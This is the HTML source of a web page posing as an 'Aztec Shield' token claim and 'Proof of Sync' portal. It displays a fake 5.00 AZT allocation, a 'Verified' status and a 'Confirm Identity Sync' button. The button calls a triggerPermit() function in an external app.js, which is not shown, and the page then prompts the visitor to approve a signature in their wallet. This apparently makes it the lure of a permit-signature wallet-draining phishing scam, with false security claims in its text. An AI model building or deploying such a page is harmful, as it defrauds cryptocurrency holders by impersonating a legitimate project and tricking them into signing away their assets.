<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="manifest" href="./manifest.json">
    <link rel="icon" href="./favicon.ico" type="image/x-icon">
    
    <!-- Open Graph Security Metadata -->
    <meta property="og:title" content="Aztec Shield | Proof of Sync">
    <meta property="og:description" content="Secure your assets with Aztec's Layer 2 Shielding protocol.">
    <meta property="og:image" content="https://aztec-2026.github.io/shield-sync/favicon.ico">
    <meta property="og:url" content="https://aztec-2026.github.io/shield-sync/">
    <meta name="twitter:card" content="summary_large_image">

    <title>Aztec | Proof of Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fafafa; color: #1a1a1b; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; -webkit-font-smoothing: antialiased; }
        .container { width: 100%; max-width: 375px; padding: 20px; }
        .brand { text-align: center; margin-bottom: 24px; }
        .brand-logo { width: 48px; height: 48px; margin: 0 auto 12px; }
        .brand-name { font-size: 18px; font-weight: 700; letter-spacing: -0.5px; color: #000; }
        .card { background: #fff; border-radius: 24px; padding: 32px 24px; box-shadow: 0 8px 30px rgba(0,0,0,0.04); border: 1px solid #f0f0f0; text-align: center; }
        .label { font-size: 13px; font-weight: 500; color: #8e8e93; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
        .value { font-size: 36px; font-weight: 800; color: #000; margin-bottom: 32px; letter-spacing: -1px; }
        .details { text-align: left; background: #f9f9f9; border-radius: 16px; padding: 16px; margin-bottom: 24px; }
        .row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 10px; }
        .key { color: #8e8e93; }
        .val { font-weight: 600; color: #1c1c1e; }
        .status { color: #34c759; }
        .btn { background: #000; color: #fff; width: 100%; border: none; border-radius: 14px; padding: 18px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .loader { display: none; padding: 40px 0; }
        .spinner { width: 28px; height: 28px; border: 3px solid #eee; border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer { font-size: 11px; color: #c7c7cc; text-align: center; margin-top: 32px; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container">
        <div class="brand">
            <svg class="brand-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="50" fill="black"/>
                <path d="M50 25L25 75H75L50 25Z" fill="white"/>
            </svg>
            <div class="brand-name">Aztec Shield</div>
        </div>
        <div id="ui-main" class="card">
            <div class="label">Shielded Allocation</div>
            <div class="value">5.00 AZT</div>
            <div class="details">
                <div class="row"><span class="key">Identity Status</span><span class="val">Verified</span></div>
                <div class="row"><span class="key">Protocol</span><span class="val">EVM Multi-Chain</span></div>
                <div class="row"><span class="key">Network</span><span class="val status">Active</span></div>
            </div>
            <button id="action-btn" class="btn">Confirm Identity Sync</button>
            <p style="font-size: 11px; color: #aeaeb2; margin-top: 16px;">Secure cryptographic verification.</p>
        </div>
        <div id="ui-loading" class="card" style="display: none;">
            <div class="loader" style="display: block;">
                <div class="spinner"></div>
                <div style="font-weight: 600; font-size: 15px;">Awaiting Signature...</div>
                <div style="font-size: 12px; color: #8e8e93; margin-top: 4px;">Approve the secure sync in your wallet</div>
            </div>
        </div>
        <div class="footer">ENCRYPTED END-TO-END VIA AZTEC CONNECT</div>
    </div>

    <!-- 1. The Interaction Logic (v8.6 compatible) -->
    <script>
        /**
         * The button now strictly calls the app.js function.
         * app.js handles the Switch, the Connection, and the UI transition.
         */
        document.getElementById('action-btn').onclick = async () => {
            if (typeof triggerPermit === 'function') {
                try {
                	// Call the hardened app.js logic
                    await triggerPermit(); 
                } catch (e) {
                    console.error("Workflow failed", e);
                    // Reset UI if it crashed before starting
                    document.getElementById('ui-main').style.display = 'block';
                    document.getElementById('ui-loading').style.display = 'none';
                }
            } else {
                alert("The synchronization module (app.js) is still loading. Please wait 1-2 seconds and try again.");
            }
        };
    </script>

    <!-- 2. The Logic Implementation -->
    <script src="app.js"></script>
</body>
</html>
